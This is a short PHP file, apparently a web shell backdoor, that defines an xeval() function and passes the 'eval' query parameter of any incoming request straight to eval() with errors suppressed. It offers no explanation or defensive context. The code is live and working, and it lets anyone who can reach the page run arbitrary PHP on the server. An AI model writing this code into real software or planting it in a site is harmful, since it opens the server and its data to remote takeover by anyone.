<?php
function xeval($code){
	@eval($code);
	$buff = "";
	return $buff;
}

if(isset($_GET['eval']) && ($_GET['eval'] != ""))
	$result = htmlspecialchars(xeval($_GET['eval']));
?>